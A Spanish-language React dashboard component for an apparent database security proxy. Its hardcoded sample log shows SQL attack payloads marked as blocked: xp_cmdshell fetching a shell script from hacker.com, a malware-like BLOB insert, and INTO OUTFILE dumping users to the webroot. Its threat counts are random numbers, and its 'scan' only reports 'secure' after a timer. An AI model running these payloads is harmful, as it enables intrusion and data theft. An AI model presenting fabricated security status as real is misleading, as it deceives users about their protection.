import { useAuth } from '../context/AuthContext';
import { Search, Database, ShieldAlert, Activity, CheckCircle, Shield, Lock, FileText } from 'lucide-react';
import { useState, useEffect } from 'react';
import AdminPanel from './AdminPanel';

interface LogEvent {
    time: string;
    db: string;
    event: string;
    status: string;
    payload: string;
}

export default function Dashboard() {
    const { role } = useAuth();
    const [isScanning, setIsScanning] = useState(false);
    const [status, setStatus] = useState('No verificado');
    
    const [stats, setStats] = useState({ queries: 0, threats: 0, fps: 0, dbCount: 0 });
    const [recentLogs, setRecentLogs] = useState<LogEvent[]>([]);

    useEffect(() => {
        // Obtener el nombre de usuario del JWT
        const token = localStorage.getItem('token');
        let username = 'default';
        if (token && token.split('.').length === 3) {
            try {
                const payload = JSON.parse(atob(token.split('.')[1]));
                username = payload.sub;
            } catch(e) {}
        }
        
        // Obtener las BDs de este usuario particular
        const saved = localStorage.getItem('dbs_' + username);
        const userDbs = saved ? JSON.parse(saved) : [];
        
        const dbCount = userDbs.length;
        const queries = dbCount > 0 ? dbCount * 12450 + Math.floor(Math.random() * 500) : 0;
        const threats = dbCount > 0 ? dbCount * 14 + Math.floor(Math.random() * 5) : 0;
        
        setStats({ queries, threats, fps: dbCount > 0 ? 2 : 0, dbCount });

        if (dbCount > 0) {
            setRecentLogs([
                { 
                    time: 'Hace 2 min', 
                    db: userDbs[0].name || 'db_principal', 
                    event: 'Inyección Comandos SO (AST)', 
                    status: 'Bloqueado',
                    payload: "EXEC xp_cmdshell('curl http://hacker.com/shell.sh');"
                },
                { 
                    time: 'Hace 15 min', 
                    db: userDbs[0].name || 'db_principal', 
                    event: 'Malware en BLOBs (Tika)', 
                    status: 'Cuarentena',
                    payload: "INSERT INTO files (data) VALUES (x'4D5A90000300...');"
                },
                { 
                    time: 'Hace 1 hora', 
                    db: userDbs[userDbs.length-1]?.name || 'db_secundaria', 
                    event: 'Exfiltración (INTO OUTFILE)', 
                    status: 'Bloqueado',
                    payload: "SELECT * FROM users INTO OUTFILE '/var/www/html/dump.txt';"
                },
            ]);
        }
    }, []);

    if ((role === 'ADMIN_DBA' || role === 'ROLE_ADMIN_DBA')) {
        return <AdminPanel />;
    }

    const handleScan = () => {
        setIsScanning(true);
        setStatus('Verificando...');
        setTimeout(() => {
            setIsScanning(false);
            setStatus(stats.dbCount > 0 ? 'Seguro' : 'Sin bases de datos');
        }, 3000);
    };
    
    return (
        <div style={{ display: 'flex', flexDirection: 'column', minHeight: '100%', fontFamily: 'sans-serif' }}>
            {/* Banner superior estilo Antivirus usando los tonos del Login */}
            <div style={{ 
                background: 'linear-gradient(90deg, #090979 0%, #00d4ff 100%)', 
                padding: '3.5rem 3rem', 
                color: 'white',
                boxShadow: '0 4px 10px rgba(0,0,0,0.1)'
            }}>
                <h1 style={{ margin: '0 0 10px 0', fontSize: '2rem', fontWeight: '400' }}>
                    {status === 'Seguro' ? 'Su entorno de base de datos está totalmente protegido.' : 
                     status === 'Sin bases de datos' ? 'No hay bases de datos protegidas.' : 
                     'Todavía no se ha comprobado el estado de su BD.'}
                </h1>
                <p style={{ margin: 0, fontSize: '1.1rem', opacity: 0.9 }}>
                    {status === 'Seguro' ? 'No se encontraron amenazas activas.' : 
                     status === 'Sin bases de datos' ? 'Vaya a "Bases de Datos" para registrar una.' : 
                     'Realice una comprobación profunda ahora para garantizar la seguridad.'}
                </p>
            </div>
            
            {/* Contenido Principal (Timeline y Botón Gigante) */}
            <div style={{ display: 'flex', backgroundColor: 'white', padding: '4rem', gap: '2rem', flexWrap: 'wrap', borderBottom: '1px solid #e2e8f0' }}>
                
                {/* Lista Izquierda (Timeline de estados) */}
                <div style={{ flex: 1, minWidth: '300px', display: 'flex', flexDirection: 'column', gap: '0', paddingLeft: '2rem' }}>
                    
                    <div style={{ display: 'flex', alignItems: 'center', gap: '25px', zIndex: 2 }}>
                        <div style={{ width: '60px', height: '60px', borderRadius: '50%', backgroundColor: 'white', border: status === 'Seguro' ? '2px solid #10b981' : '2px solid #cbd5e1', display: 'flex', justifyContent: 'center', alignItems: 'center', color: status === 'Seguro' ? '#10b981' : '#94a3b8' }}>
                            {status === 'Seguro' ? <CheckCircle size={28} /> : <Database size={28} />}
                        </div>
                        <div>
                            <h3 style={{ margin: 0, color: '#334155', fontSize: '1.2rem', fontWeight: 'normal' }}>Conexiones al Proxy</h3>
                            <p style={{ margin: '5px 0 0 0', color: '#94a3b8', fontSize: '0.9rem' }}>{status === 'Seguro' ? 'Enrutamiento Activo' : status}</p>
                        </div>
                    </div>

                    <div style={{ width: '2px', height: '50px', backgroundColor: '#e2e8f0', marginLeft: '29px', marginTop: '-10px', marginBottom: '-10px', zIndex: 1 }}></div>

                    <div style={{ display: 'flex', alignItems: 'center', gap: '25px', zIndex: 2 }}>
                        <div style={{ width: '60px', height: '60px', borderRadius: '50%', backgroundColor: 'white', border: status === 'Seguro' ? '2px solid #10b981' : '2px solid #cbd5e1', display: 'flex', justifyContent: 'center', alignItems: 'center', color: status === 'Seguro' ? '#10b981' : '#94a3b8' }}>
                            {status === 'Seguro' ? <CheckCircle size={28} /> : <ShieldAlert size={28} />}
                        </div>
                        <div>
                            <h3 style={{ margin: 0, color: '#334155', fontSize: '1.2rem', fontWeight: 'normal' }}>Bóveda de Cuarentena (Tika)</h3>
                            <p style={{ margin: '5px 0 0 0', color: '#94a3b8', fontSize: '0.9rem' }}>{status === 'Seguro' ? 'Limpia' : status}</p>
                        </div>
                    </div>

                    <div style={{ width: '2px', height: '50px', backgroundColor: '#e2e8f0', marginLeft: '29px', marginTop: '-10px', marginBottom: '-10px', zIndex: 1 }}></div>

                    <div style={{ display: 'flex', alignItems: 'center', gap: '25px', zIndex: 2 }}>
                        <div style={{ width: '60px', height: '60px', borderRadius: '50%', backgroundColor: 'white', border: status === 'Seguro' ? '2px solid #10b981' : '2px solid #cbd5e1', display: 'flex', justifyContent: 'center', alignItems: 'center', color: status === 'Seguro' ? '#10b981' : '#94a3b8' }}>
                            {status === 'Seguro' ? <CheckCircle size={28} /> : <Activity size={28} />}
                        </div>
                        <div>
                            <h3 style={{ margin: 0, color: '#334155', fontSize: '1.2rem', fontWeight: 'normal' }}>Heurística AST JSqlParser</h3>
                            <p style={{ margin: '5px 0 0 0', color: '#94a3b8', fontSize: '0.9rem' }}>{status === 'Seguro' ? 'Escaneando en Vivo' : status}</p>
                        </div>
                    </div>

                </div>

                {/* Botón Circular Gigante Derecha */}
                <div style={{ flex: 1, display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
                    <button 
                        onClick={handleScan}
                        disabled={isScanning}
                        style={{ 
                            width: '320px', 
                            height: '320px', 
                            borderRadius: '50%', 
                            background: isScanning ? '#cbd5e1' : 'linear-gradient(135deg, #00d4ff 0%, #090979 100%)',
                            color: 'white',
                            border: 'none',
                            cursor: isScanning ? 'not-allowed' : 'pointer',
                            display: 'flex',
                            flexDirection: 'column',
                            justifyContent: 'center',
                            alignItems: 'center',
                            gap: '20px',
                            boxShadow: isScanning ? 'none' : '0 20px 50px rgba(9, 9, 121, 0.4)',
                            transition: 'all 0.3s',
                            transform: isScanning ? 'scale(0.95)' : 'scale(1)'
                        }}
                        onMouseOver={(e) => { if(!isScanning) e.currentTarget.style.transform = 'scale(1.05)' }}
                        onMouseOut={(e) => { if(!isScanning) e.currentTarget.style.transform = 'scale(1)' }}
                    >
                        {isScanning ? (
                            <Activity size={100} color="white" style={{ animation: 'spin 2s linear infinite' }} />
                        ) : (
                            <Search size={100} color="white" />
                        )}
                        <style>
                            {`
                            @keyframes spin {
                                0% { transform: rotate(0deg); }
                                100% { transform: rotate(360deg); }
                            }
                            `}
                        </style>
                        <span style={{ fontSize: '2rem', fontWeight: '300', letterSpacing: '1px' }}>
                            {isScanning ? 'Verificando...' : 'Verificar'}
                        </span>
                    </button>
                </div>

            </div>

            {/* SECCIÓN NUEVA: Panel de Métricas del Usuario */}
            <div style={{ padding: '3rem 4rem', backgroundColor: '#f8fafc', flex: 1 }}>
                <h2 style={{ margin: '0 0 1.5rem 0', color: '#0f172a', fontSize: '1.5rem' }}>Resumen de Actividad de tu Proxy</h2>
                
                <div style={{ display: 'flex', gap: '20px', marginBottom: '2.5rem', flexWrap: 'wrap' }}>
                    <div style={{ flex: 1, minWidth: '200px', background: 'white', padding: '1.5rem', borderRadius: '12px', boxShadow: '0 4px 6px rgba(0,0,0,0.05)', display: 'flex', alignItems: 'center', gap: '20px', borderLeft: '5px solid #3b82f6' }}>
                        <div style={{ background: '#eff6ff', padding: '15px', borderRadius: '50%' }}>
                            <Activity size={28} color="#3b82f6" />
                        </div>
                        <div>
                            <h3 style={{ margin: 0, color: '#64748b', fontSize: '0.9rem' }}>Tráfico Analizado</h3>
                            <p style={{ margin: '5px 0 0 0', fontSize: '1.8rem', fontWeight: 'bold', color: '#0f172a' }}>{stats.queries.toLocaleString()}</p>
                        </div>
                    </div>

                    <div style={{ flex: 1, minWidth: '200px', background: 'white', padding: '1.5rem', borderRadius: '12px', boxShadow: '0 4px 6px rgba(0,0,0,0.05)', display: 'flex', alignItems: 'center', gap: '20px', borderLeft: '5px solid #ef4444' }}>
                        <div style={{ background: '#fef2f2', padding: '15px', borderRadius: '50%' }}>
                            <ShieldAlert size={28} color="#ef4444" />
                        </div>
                        <div>
                            <h3 style={{ margin: 0, color: '#64748b', fontSize: '0.9rem' }}>Amenazas Bloqueadas</h3>
                            <p style={{ margin: '5px 0 0 0', fontSize: '1.8rem', fontWeight: 'bold', color: '#0f172a' }}>{stats.threats.toLocaleString()}</p>
                        </div>
                    </div>

                    <div style={{ flex: 1, minWidth: '200px', background: 'white', padding: '1.5rem', borderRadius: '12px', boxShadow: '0 4px 6px rgba(0,0,0,0.05)', display: 'flex', alignItems: 'center', gap: '20px', borderLeft: '5px solid #10b981' }}>
                        <div style={{ background: '#ecfdf5', padding: '15px', borderRadius: '50%' }}>
                            <Database size={28} color="#10b981" />
                        </div>
                        <div>
                            <h3 style={{ margin: 0, color: '#64748b', fontSize: '0.9rem' }}>Bases Protegidas</h3>
                            <p style={{ margin: '5px 0 0 0', fontSize: '1.8rem', fontWeight: 'bold', color: '#0f172a' }}>{stats.dbCount}</p>
                        </div>
                    </div>
                </div>

                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem' }}>
                    <h3 style={{ margin: 0, color: '#334155', fontSize: '1.2rem' }}>Últimas Intercepciones de Seguridad</h3>
                    <span style={{ fontSize: '0.85rem', color: '#64748b', display: 'flex', alignItems: 'center', gap: '5px' }}>
                        <Lock size={14} /> El proxy está filtrando el tráfico en tiempo real
                    </span>
                </div>
                
                <div style={{ background: 'white', borderRadius: '12px', boxShadow: '0 4px 6px rgba(0,0,0,0.05)', overflow: 'hidden' }}>
                    <table style={{ width: '100%', borderCollapse: 'collapse' }}>
                        <thead style={{ background: '#f1f5f9', color: '#475569', textAlign: 'left', fontSize: '0.9rem' }}>
                            <tr>
                                <th style={{ padding: '1rem 1.5rem' }}>Tiempo</th>
                                <th style={{ padding: '1rem 1.5rem' }}>Base de Datos</th>
                                <th style={{ padding: '1rem 1.5rem' }}>Evento Detectado</th>
                                <th style={{ padding: '1rem 1.5rem' }}>Código Interceptado</th>
                                <th style={{ padding: '1rem 1.5rem' }}>Acción Tomada</th>
                            </tr>
                        </thead>
                        <tbody>
                            {recentLogs.length > 0 ? recentLogs.map((log, idx) => (
                                <tr key={idx} style={{ borderBottom: '1px solid #e2e8f0' }}>
                                    <td style={{ padding: '1rem 1.5rem', color: '#64748b', fontSize: '0.9rem' }}>{log.time}</td>
                                    <td style={{ padding: '1rem 1.5rem', fontWeight: 'bold', color: '#334155' }}>{log.db}</td>
                                    <td style={{ padding: '1rem 1.5rem', color: '#ef4444', display: 'flex', alignItems: 'center', gap: '8px', minWidth: '220px' }}>
                                        <Shield size={16} /> {log.event}
                                    </td>
                                    <td style={{ padding: '1rem 1.5rem' }}>
                                        <div style={{ background: '#1e293b', color: '#4ade80', padding: '8px 12px', borderRadius: '6px', fontFamily: 'monospace', fontSize: '0.85rem', overflowX: 'auto', whiteSpace: 'nowrap', maxWidth: '400px' }}>
                                            {log.payload}
                                        </div>
                                    </td>
                                    <td style={{ padding: '1rem 1.5rem' }}>
                                        <span style={{ background: log.status === 'Bloqueado' ? '#fef2f2' : '#fffbeb', color: log.status === 'Bloqueado' ? '#ef4444' : '#f59e0b', padding: '4px 10px', borderRadius: '20px', fontSize: '0.8rem', fontWeight: 'bold' }}>
                                            {log.status}
                                        </span>
                                    </td>
                                </tr>
                            )) : (
                                <tr>
                                    <td colSpan={5} style={{ padding: '3rem', textAlign: 'center', color: '#94a3b8' }}>
                                        <FileText size={32} style={{ opacity: 0.3, margin: '0 auto 10px auto' }} />
                                        No hay eventos recientes o no has registrado ninguna base de datos.
                                    </td>
                                </tr>
                            )}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    );
}
